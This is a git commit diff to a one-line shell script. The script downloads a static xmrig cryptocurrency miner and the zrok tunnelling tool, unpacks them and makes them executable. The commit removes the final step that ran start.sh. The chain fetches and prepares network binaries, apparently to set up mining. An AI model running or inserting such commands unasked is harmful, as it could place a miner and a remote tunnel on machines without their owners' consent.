db1a02a6f92cca4ed055d2ff3df9e4906a2585aa
Luisbuttocks <costomf00.04@gmail.com>
2026-01-29 13:40:38 +0530

    Update script86.sh

--- script86.sh
+++ script86.sh
@@ -1,4 +1,4 @@
-wget https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static && wget https://github.com/openziti/zrok/releases/download/v1.1.10/zrok_1.1.10_linux_amd64.tar.gz && tar -xvf zrok_1.1.10_linux_amd64.tar.gz && chmod +x xmrig-x86_64-static && chmod +x start.sh && ./start.sh
+wget https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static && wget https://github.com/openziti/zrok/releases/download/v1.1.10/zrok_1.1.10_linux_amd64.tar.gz && tar -xvf zrok_1.1.10_linux_amd64.tar.gz && chmod +x xmrig-x86_64-static && chmod +x start.sh
 
 
 
